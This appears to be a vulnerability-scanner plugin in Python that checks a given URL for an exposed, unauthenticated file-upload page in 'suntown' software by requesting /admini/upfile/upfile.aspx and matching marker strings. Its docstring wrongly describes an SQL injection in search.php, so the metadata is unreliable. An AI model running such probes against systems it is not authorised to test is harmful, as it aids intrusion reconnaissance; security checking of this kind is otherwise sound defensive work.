#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: suntown未授权任意文件上传漏洞
referer: http://www.wooyun.org/bugs/wooyun-2010-063656
author: Lucifer
description: 文件/zhidao/zhidao/search.php中,参数fulltext存在SQL注入。
'''
import sys
import requests
import warnings
def run(url):
        result = ['suntown未授权任意文件上传漏洞','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
            }
        payload = "/admini/upfile/upfile.aspx"
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"PageA_name" in req.text and r"PageA_per" in req.text:
                result[2]=  '存在'
                result[1] = vulnurl
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
